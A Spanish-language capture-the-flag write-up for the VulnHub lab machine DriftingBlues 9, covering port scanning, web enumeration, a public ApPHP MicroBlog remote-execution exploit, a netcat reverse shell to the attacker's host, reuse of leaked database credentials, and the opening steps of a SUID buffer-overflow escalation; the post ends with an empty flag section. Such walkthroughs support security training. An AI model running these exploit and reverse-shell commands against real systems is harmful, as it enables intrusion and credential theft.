---
title: DriftingBlues 9 Writeup - Vulnhub
date: 2025-02-04
categories: [Writeups, Vulnhub]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, DriftingBlues]
image:
  path: /assets/img/commons/vulnhub/vulnhub.jpg
---

Resolución máquina anterior: [**DriftingBlues7**](https://lvs3c.github.io/posts/DriftingBlues-7/)

¡Saludos!

Llegamos al final de la serie **DriftingBlues**!

En este writeup, nos adentraremos en la última máquina [**DriftingBlues9**](https://www.vulnhub.com/entry/driftingblues-9-final,695/), la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la cual veremos **enumeración de servicios**, **cewl** para generar un diccionario y realizar fuerza bruta sobre **Wordpress** con **wpscan**, **Hydra** para fuerta bruta del servicio `SSH`{: .filepath} para luego conectarnos a la máquina víctima y utilizaremos **linPEAS** y **Pspy** para validar el sitema y procesos logrando así elevar nuestros privilegios como usuario **root**, obteniendo las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.40     00:0c:29:ae:ea:a2       VMware, Inc.
10.11.12.254    00:50:56:f6:71:b0       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.369 seconds (108.06 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.40
PING 10.11.12.40 (10.11.12.40) 56(84) bytes of data.
64 bytes from 10.11.12.40: icmp_seq=1 ttl=64 time=0.435 ms

--- 10.11.12.40 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.435/0.435/0.435/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.40 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 17:00 -03
Nmap scan report for 10.11.12.40
Host is up (0.0023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
57058/tcp open  unknown
MAC Address: 00:0C:29:AE:EA:A2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.35 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p80,111,57058 -sCV 10.11.12.40 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 17:01 -03
Nmap scan report for 10.11.12.40
Host is up (0.00026s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: ApPHP MicroBlog
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-generator: ApPHP MicroBlog vCURRENT_VERSION
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37545/udp   status
|   100024  1          56616/udp6  status
|   100024  1          57058/tcp   status
|_  100024  1          58289/tcp6  status
57058/tcp open  status  1 (RPC #100024)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.96 seconds
```

El informe de `Nmap` nos revela:
- Puerto `80` servidor `Apache 2.4.10`.
- Puerto `111` servidor `rcpbind 2-4`.
- Puerto `80` servidor `rcp`.


### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.40/
http://10.11.12.40/ [200 OK] Apache[2.4.10], Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[admin@domain.com], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.11.12.40], Meta-Author[ApPHP Company - Advanced Power of PHP], MetaGenerator[ApPHP MicroBlog vCURRENT_VERSION], Script[text/javascript], Title[ApPHP MicroBlog]
```

![web](/assets/img/commons/vulnhub/DriftingBlues9/web.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯  nmap -p80 --script http-enum 10.11.12.40 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 17:23 -03
Nmap scan report for 10.11.12.40
Host is up (0.00047s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /admin/home.php: Possible admin folder
|   /backup/: Backup folder w/ directory listing
|   /rss.xml: RSS or Atom feed
|   /README.txt: Interesting, a readme.
|   /docs/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /include/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /license/: Potentially interesting folder
|   /page/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|_  /styles/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'

Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
```

Lanzamos `gobuster` para obtener más resultados y mediante el archivo `install.txt` obtenemos la versión de la plataforma y de php.

```bash
❯ gobuster dir -u http://10.11.12.40/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -x txt,php,bak,zip -o gobuster.log
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.40/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,bak,zip
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.40/images               (Status: 301) [Size: 311] [--> http://10.11.12.40/images/]
http://10.11.12.40/.php                 (Status: 403) [Size: 276]
http://10.11.12.40/index.php            (Status: 200) [Size: 5650]
http://10.11.12.40/docs                 (Status: 301) [Size: 309] [--> http://10.11.12.40/docs/]
http://10.11.12.40/page                 (Status: 301) [Size: 309] [--> http://10.11.12.40/page/]
http://10.11.12.40/header.php           (Status: 200) [Size: 13]
http://10.11.12.40/admin                (Status: 301) [Size: 310] [--> http://10.11.12.40/admin/]
http://10.11.12.40/footer.php           (Status: 500) [Size: 614]
http://10.11.12.40/license              (Status: 301) [Size: 312] [--> http://10.11.12.40/license/]
http://10.11.12.40/README.txt           (Status: 200) [Size: 975]
http://10.11.12.40/js                   (Status: 301) [Size: 307] [--> http://10.11.12.40/js/]
http://10.11.12.40/include              (Status: 301) [Size: 312] [--> http://10.11.12.40/include/]
http://10.11.12.40/backup               (Status: 301) [Size: 311] [--> http://10.11.12.40/backup/]
http://10.11.12.40/styles               (Status: 301) [Size: 311] [--> http://10.11.12.40/styles/]
http://10.11.12.40/INSTALL.txt          (Status: 200) [Size: 1201]
http://10.11.12.40/.php                 (Status: 403) [Size: 276]
http://10.11.12.40/wysiwyg              (Status: 301) [Size: 312] [--> http://10.11.12.40/wysiwyg/]
http://10.11.12.40/server-status        (Status: 403) [Size: 276]
http://10.11.12.40/mails                (Status: 301) [Size: 310] [--> http://10.11.12.40/mails/]
```

![versionapphp](/assets/img/commons/vulnhub/DriftingBlues9/versionapphp.png){: .center-image }

Buscamos en `searchsploit` para encontrar vulnerabilidades.

```bash
❯ searchsploit ApPHP
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities                                  | php/webapps/33030.txt
ApPHP MicroBlog 1.0.1 - Remote Command Execution                                  | php/webapps/33070.py
```

Revisamos el código del exploit *33030.txt* y damos con la vulnerabilidad de ejecución de código remoto.

![rce](/assets/img/commons/vulnhub/DriftingBlues9/rce.png){: .center-image }

Validamos dicha vulnerabilidad sobre la web.

![rce_web](/assets/img/commons/vulnhub/DriftingBlues9/rce_web.png){: .center-image }

Dicho RCE no nos deja lanzarnos una reverse shell, vamos a utilizar el otro exploit en python `33070.py`.

## Explotación

---

Ejecutamos el exploit en python y nos dice que el sitio es vulnerable, trayéndonos además, información importante del usuario.

Lo siguiente es ponernos en escucha desde nuestro equipo y lanzarnos una conexión con `nc`{: .filepath} desde el exploit.

```bash
❯ python2.7 33070.py http://10.11.12.40
  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
[*] Testing for vulnerability...
[+] Website is vulnerable

[*] Fetching include/base.inc.php
<?php
                        // DATABASE CONNECTION INFORMATION
                        define('DATABASE_HOST', 'localhost');           // Database host
                        define('DATABASE_NAME', 'microblog');           // Name of the database to be used
                        define('DATABASE_USERNAME', 'clapton'); // User name for access to database
                        define('DATABASE_PASSWORD', 'yaraklitepe');     // Password for access to database
                        define('DB_ENCRYPT_KEY', 'p52plaiqb8');         // Database encryption key
                        define('DB_PREFIX', 'mb101_');              // Unique prefix of all table names in the database
                        ?>

[*] Testing remote execution
[+] Remote exec is working with system() :)
Submit your commands, type exit to quit

> nc 10.11.12.10 443 -e /bin/bash
```

Recibimos la conexión.

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.40] 40471
whoami
www-data
script /dev/null -c bash
www-data@debian:/var/www/html$
```

## Pivoting de usuario

---

En este punto somos `www-data`, vamos a probar convertirnos en el usuario `clapton` con los datos que nos brindó el exploit.

```bash
clapton@debian:/home$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
clapton:x:1000:1000:,,,:/home/clapton:/bin/bash

www-data@debian:/home$ su - clapton
su - clapton
Password: yaraklitepe

clapton@debian:~$
```

## Escalación de privilegios

---

Listamos la Flag 1.

```bash
clapton@debian:~$ ls -la
ls -la
total 24
dr-x------ 2 clapton clapton 4096 May  9  2021 .
drwxr-xr-x 3 root    root    4096 May  9  2021 ..
-rwsr-xr-x 1 root    root    5150 Sep 22  2015 input
-rwxr-xr-x 1 root    root     201 May  9  2021 note.txt
-rw-r--r-- 1 clapton clapton   32 May  9  2021 user.txt

clapton@debian:~$ cat user.txt
cat user.txt
F569AA95FAFF65E7A290AB9ED031E04F
clapton@debian:~$
```

Listamos el contenido del archivo `note.txt`.

```bash
clapton@debian:~$ cat note.txt
cat note.txt
buffer overflow is the way. ( ͡° ͜ʖ ͡°)

if you're new on 32bit bof then check these:

https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html
https://samsclass.info/127/proj/lbuf1.htm
```

Por lo que vemos, el archivo `input` tiene activado el binario **SUID**, con lo cual vamos a tener que explotar el `buffer overflow` sobre este archivo.

Validamos el script.

```bash
❯ ./input
Syntax: ./input <input string>
```

Nos pide ingresar una cadena, la cual vamos a probar con muchas `A` para ver si se rompe, nos traemos el archivo a nuestra pc local y probamos.

```bash
❯ ./input AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./input
```

Tenemos el `buffer overflow`{: .filepath}, ahora vamos a proceder con los pasos necesarios para mediante el buffer overflow poder hacernos root.

Pasos:
- Validar ASLR
- Crear un patron de caracteres con `msf-pattern_create` para obtener el valor de `EIP`.
- Utilizar  `msf-pattern_offset` para calcular la longitud del patrón de caracteres.
- Encontrar el `jmp ESP`, para poner nuestro script en la pila de ejecución.
- Usamos `msfvenom` para crear nuestro `reverse shell code` evitando los *badchars*.

Vamos a ir creando un script en python a medida que avanzamos con los pasos.

Listamos la Flag 2.

```bash

```

Hope it helps!